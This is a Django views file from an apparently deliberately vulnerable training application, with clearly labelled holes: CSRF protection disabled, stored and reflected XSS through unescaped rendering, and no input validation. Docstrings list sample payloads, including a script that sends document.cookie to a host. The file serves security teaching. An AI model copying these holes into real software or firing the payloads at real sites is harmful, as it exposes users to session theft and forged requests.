"""
feedback/views.py
=================
INTENTIONAL VULNERABILITIES:
  [V-16] Stored XSS      – message stored raw, rendered unescaped on the wall
  [V-17] CSRF disabled   – @csrf_exempt on the submit endpoint
  [V-18] Reflected XSS   – search term echoed back unescaped in the template
  [V-19] No input validation / length limits enforced in the view
"""

from django.shortcuts import render, redirect
from django.views.decorators.csrf import csrf_exempt
from .models import Feedback


# ── [V-17] CSRF protection disabled ──────────────────────────────────────────
@csrf_exempt
def submit_feedback(request):
    """
    The @csrf_exempt decorator removes the CSRF check entirely.
    Any page on the internet can POST to this endpoint on behalf of the visitor.

    Combine with [V-16]: a malicious site submits a feedback entry containing
    a <script> payload; when an admin views the feedback wall the script runs.
    """
    if request.method == "POST":
        Feedback.objects.create(
            name=request.POST.get("name", ""),
            email=request.POST.get("email", ""),
            # ❌ VULNERABLE: no sanitisation whatsoever
            message=request.POST.get("message", ""),
        )
        return redirect("/feedback/wall/")

    return render(request, "feedback/submit.html")


def feedback_wall(request):
    """
    Displays all feedback entries.
    Template renders {{ entry.message|safe }} – bypasses Django auto-escaping.

    Stored XSS payload to try in the submit form:
        <script>fetch('http://localhost:8000/?cookie='+document.cookie)</script>
        <img src=x onerror="alert('XSS')">
    """
    entries = Feedback.objects.all().order_by("-created_at")
    return render(request, "feedback/wall.html", {"entries": entries})


# ── [V-18] Reflected XSS ─────────────────────────────────────────────────────
def feedback_search(request):
    """
    The ?q= parameter is echoed back into the page via {{ query|safe }}.

    Reflected XSS payload in the URL:
        /feedback/search/?q=<script>alert(document.cookie)</script>
        /feedback/search/?q=<img src=x onerror=alert(1)>
    """
    query   = request.GET.get("q", "")
    results = []

    if query:
        results = Feedback.objects.filter(message__icontains=query)

    return render(request, "feedback/search.html",
                  {"query": query, "results": results})
